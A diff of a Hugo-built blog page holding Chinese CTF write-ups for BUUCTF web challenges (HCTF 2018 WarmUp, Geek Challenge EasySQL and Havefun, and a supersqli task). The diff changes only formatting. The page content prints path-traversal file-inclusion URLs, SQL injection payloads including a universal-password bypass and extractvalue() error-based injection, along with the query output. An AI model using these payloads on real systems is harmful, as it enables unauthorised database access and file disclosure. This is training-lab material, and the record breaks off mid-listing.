@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.81.0" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -60,7 +60,7 @@
         "description": "【HCTF 2018】WarmUp 知识点：文件包含漏洞(phpmyadmin 4.8.1……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  5511 ,
+        "wordCount":  5599 ,
         "image": ["https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210614131217227.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210614125058820.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image20210613170513940.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210613171541347.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615152835773.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615153239240.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615193903774.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115120754.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115218415.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115302503.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115518966.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616120105222.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132723578.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132859954.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133002729.png","https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133059398.png"],
         "author": {
             "@type": "Person",
@@ -231,7 +231,7 @@
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;11&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;12&nbsp;分钟</span>
     
     
     
@@ -321,10 +321,10 @@
 <p>ctrl+shift+i  查看网页源代码，发现提示 source.php</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">!</span><span class="o">--</span><span class="n">source</span><span class="o">.</span><span class="n">php</span><span class="o">--&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">!</span><span class="o">--</span><span class="n">source</span><span class="o">.</span><span class="n">php</span><span class="o">--&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>url 打开source.php 文件。发现hint.php 文件</p>
@@ -332,17 +332,17 @@
 <p>打开 <code>http://af382c6e-72dc-485e-86c3-df8ac4429272.node3.buuoj.cn/?file=hint.php</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">flag</span> <span class="k">not</span> <span class="nx">here</span><span class="p">,</span> <span class="k">and</span> <span class="nx">flag</span> <span class="nx">in</span> <span class="nx">ffffllllaaaagggg</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">flag</span> <span class="k">not</span> <span class="nx">here</span><span class="p">,</span> <span class="k">and</span> <span class="nx">flag</span> <span class="nx">in</span> <span class="nx">ffffllllaaaagggg</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到flag应该存在于<font color=#8470FF> ffffllllaaaagggg</font>文件中</p>
 <p>查看 source.php 源代码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -394,7 +394,7 @@
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
     <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
     <span class="k">class</span> <span class="nc">emmm</span>
     <span class="p">{</span>
@@ -449,23 +449,23 @@
 </div><p>发现只有</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>才能通过，但发现截取有问题</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
                 <span class="nv">$_page</span><span class="p">,</span>
                 <span class="mi">0</span><span class="p">,</span>
                 <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$_page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
@@ -474,7 +474,7 @@
 </div>
 </div><p>在source.php?后加一个/，这时 source.php会被视为一个文件夹，后面每一级的 .. 意为上一层文件夹，通过不断尝试加入../最后可以知道具体的目录层级，以访问到ffffllllaaaagggg。</p>
 <p>随即构造</p>
-<pre><code class="language-php+HTML" data-lang="php+HTML">http://af382c6e-72dc-485e-86c3-df8ac4429272.node3.buuoj.cn?file=hint.php?/../../../../ffffllllaaaagggg
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">http://af382c6e-72dc-485e-86c3-df8ac4429272.node3.buuoj.cn?file=hint.php?/../../../../ffffllllaaaagggg
 </code></pre><p>flag{8f6dc82a-3d07-41ca-a3af-55b2f99bc31b}</p>
 <h2 id="font-color0288d1-极客大挑战-2019easysqlfont"><a href="#font-color0288d1-极客大挑战-2019easysqlfont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1-极客大挑战-2019easysqlfont" class="headings"><font color=#0288D1> 【极客大挑战 2019】EasySQL</font></a></h2>
 <h3 id="font-colora020f0知识点sql注入构造闭合万能密码font"><a href="#font-colora020f0知识点sql注入构造闭合万能密码font" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0知识点sql注入构造闭合万能密码font" class="headings"><font color=#A020F0>知识点：SQL注入，构造闭合，万能密码</font></a></h3>
@@ -486,20 +486,20 @@
 <p>解法一：构造闭合 ：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">58020</span><span class="n">c29</span><span class="o">-</span><span class="mf">22e8</span><span class="o">-</span><span class="mi">4468</span><span class="o">-</span><span class="n">adc5</span><span class="o">-</span><span class="n">fca72513e89d</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,database() %23 &amp;password=1</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">58020</span><span class="n">c29</span><span class="o">-</span><span class="mf">22e8</span><span class="o">-</span><span class="mi">4468</span><span class="o">-</span><span class="n">adc5</span><span class="o">-</span><span class="n">fca72513e89d</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,database() %23 &amp;password=1</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210613171541347.png" alt=""></p>
 <p>解法二：使用万能密码构造闭合：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">58020</span><span class="n">c29</span><span class="o">-</span><span class="mf">22e8</span><span class="o">-</span><span class="mi">4468</span><span class="o">-</span><span class="n">adc5</span><span class="o">-</span><span class="n">fca72513e89d</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span> <span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">58020</span><span class="n">c29</span><span class="o">-</span><span class="mf">22e8</span><span class="o">-</span><span class="mi">4468</span><span class="o">-</span><span class="n">adc5</span><span class="o">-</span><span class="n">fca72513e89d</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span> <span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="font-color0288d1-极客大挑战-2019havefunfont"><a href="#font-color0288d1-极客大挑战-2019havefunfont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1-极客大挑战-2019havefunfont" class="headings"><font color=#0288D1> 【极客大挑战 2019】Havefun</font></a></h2>
@@ -508,7 +508,7 @@
 <p>F12查看源码，会看到：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -517,7 +517,7 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;!--</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;!--</span>
         <span class="nv">$cat</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cat&#39;</span><span class="p">];</span>
         <span class="k">echo</span> <span class="nv">$cat</span><span class="p">;</span>
         <span class="k">if</span><span class="p">(</span><span class="nv">$cat</span><span class="o">==</span><span class="s1">&#39;dog&#39;</span><span class="p">){</span>
@@ -529,10 +529,10 @@
 </div><p>直接在url 中加入参数：?cat=dog 即可得到flag</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">7730091</span><span class="n">d</span><span class="o">-</span><span class="n">d625</span><span class="o">-</span><span class="mi">459</span><span class="n">b</span><span class="o">-</span><span class="mi">8</span><span class="n">ff3</span><span class="o">-</span><span class="n">f0136260e6db</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="err">?</span><span class="n">cat</span><span class="o">=</span><span class="n">dog</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">7730091</span><span class="n">d</span><span class="o">-</span><span class="n">d625</span><span class="o">-</span><span class="mi">459</span><span class="n">b</span><span class="o">-</span><span class="mi">8</span><span class="n">ff3</span><span class="o">-</span><span class="n">f0136260e6db</span><span class="o">.</span><span class="n">node3</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span><span class="err">?</span><span class="n">cat</span><span class="o">=</span><span class="n">dog</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>flag{49f8ed07-a083-40c0-8f3f-a5eafe70ad32}</p>
@@ -557,7 +557,7 @@
 <p>使用 extractvalue() 报错注入查询数据库信息</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -571,17 +571,17 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="err">用户名</span>
-<span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x7e,user(),0x7e)));#
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="err">用户名</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x7e,user(),0x7e)));#
 </span><span class="s1">error 1105 : XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">root</span><span class="o">@</span><span class="n">localhost</span><span class="o">~</span><span class="s1">&#39;
-</span><span class="s1">   
+</span><span class="s1">
 </span><span class="s1">数据库
-</span><span class="s1">   
-</span><span class="s1">1&#39;</span> <span class="k">and</span> <span class="p">(</span><span class="nf">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)));</span><span class="c1">#
-</span><span class="c1"></span><span class="n">error</span> <span class="mi">1105</span> <span class="p">:</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~supersqli~&#39;</span>
-   
-<span class="err">版本</span>
-<span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x7e,version(),0x7e)));#
+</span><span class="s1">
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="nf">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)));</span><span class="c1">#
+</span><span class="c1"></span><span class="n">error</span><span class="w"> </span><span class="mi">1105</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~supersqli~&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">版本</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x7e,version(),0x7e)));#
 </span><span class="s1">error 1105 : XPATH syntax error: &#39;</span><span class="o">~</span><span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">15</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">~</span><span class="s1">&#39;
 </span></code></pre></td></tr></table></div>
 </div>
@@ -593,7 +593,7 @@
 <p>查询到所有的数据库</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -624,43 +624,43 @@
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
-  <span class="nf">string</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="s2">&#34;ctftraining&#34;</span>
-<span class="err">}</span>
-
-<span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
-  <span class="nf">string</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span> <span class="s2">&#34;information_schema&#34;</span>
-<span class="err">}</span>
-
-<span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
-  <span class="nf">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">&#34;mysql&#34;</span>
-<span class="err">}</span>
-
-<span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
-  <span class="nf">string</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span> <span class="s2">&#34;performance_schema&#34;</span>
-<span class="err">}</span>
-
-<span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
-  <span class="nf">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="s2">&#34;supersqli&#34;</span>
-<span class="err">}</span>
-
-<span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
-  <span class="nf">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;test&#34;</span>
-<span class="err">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">  </span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span><span class="w">
+</span><span class="w">  </span><span class="nf">string</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span><span class="w"> </span><span class="s2">&#34;ctftraining&#34;</span><span class="w">
+</span><span class="w"></span><span class="err">}</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">  </span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span><span class="w">
+</span><span class="w">  </span><span class="nf">string</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span><span class="w"> </span><span class="s2">&#34;information_schema&#34;</span><span class="w">
+</span><span class="w"></span><span class="err">}</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">  </span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span><span class="w">
+</span><span class="w">  </span><span class="nf">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="s2">&#34;mysql&#34;</span><span class="w">
+</span><span class="w"></span><span class="err">}</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">  </span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span><span class="w">
+</span><span class="w">  </span><span class="nf">string</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span><span class="w"> </span><span class="s2">&#34;performance_schema&#34;</span><span class="w">
+</span><span class="w"></span><span class="err">}</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">  </span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span><span class="w">
